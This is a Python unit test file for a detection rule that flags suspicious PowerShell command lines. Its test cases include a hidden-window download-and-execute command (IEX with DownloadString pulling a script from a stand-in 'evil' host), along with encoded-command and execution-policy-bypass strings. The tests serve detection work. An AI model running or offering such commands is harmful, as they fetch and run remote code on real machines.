"""Unit tests for the suspicious PowerShell detection rule. No database required."""

from app.detections.rules.suspicious_powershell import SuspiciousPowerShellDetectionRule

RULE = SuspiciousPowerShellDetectionRule()


def test_normal_powershell_no_detection(event_factory):
    event = event_factory(
        event_type="process_creation",
        process_name="powershell.exe",
        command_line=r"powershell.exe -File C:\scripts\backup.ps1",
    )
    assert RULE.evaluate([event]) == []


def test_suspicious_powershell_detected(event_factory):
    event = event_factory(
        event_type="process_creation",
        process_name="powershell.exe",
        command_line=(
            "powershell.exe -NoProfile -WindowStyle Hidden -Command "
            "IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')"
        ),
    )

    results = RULE.evaluate([event])

    assert len(results) == 1
    result = results[0]
    assert result.rule_id == "suspicious_powershell_execution"
    assert "downloadstring" in result.evidence["matched_indicators"]
    assert "-windowstyle hidden" in result.evidence["matched_indicators"]
    assert result.related_event_ids == [event.id]
    assert result.evidence["command_line"] == event.command_line


def test_non_powershell_process_ignored(event_factory):
    event = event_factory(
        event_type="process_creation",
        process_name="cmd.exe",
        command_line="cmd.exe /c -WindowStyle Hidden -EncodedCommand abc",
    )
    assert RULE.evaluate([event]) == []


def test_non_process_creation_event_ignored(event_factory):
    event = event_factory(
        event_type="network_connection",
        process_name="powershell.exe",
        command_line="-WindowStyle Hidden -EncodedCommand abc",
    )
    assert RULE.evaluate([event]) == []


def test_missing_command_line_no_detection(event_factory):
    event = event_factory(event_type="process_creation", process_name="powershell.exe", command_line=None)
    assert RULE.evaluate([event]) == []


def test_pwsh_core_process_name_is_recognized(event_factory):
    event = event_factory(
        event_type="process_creation",
        process_name="pwsh",
        command_line="pwsh -ExecutionPolicy Bypass -Command Invoke-Expression $x",
    )
    results = RULE.evaluate([event])
    assert len(results) == 1
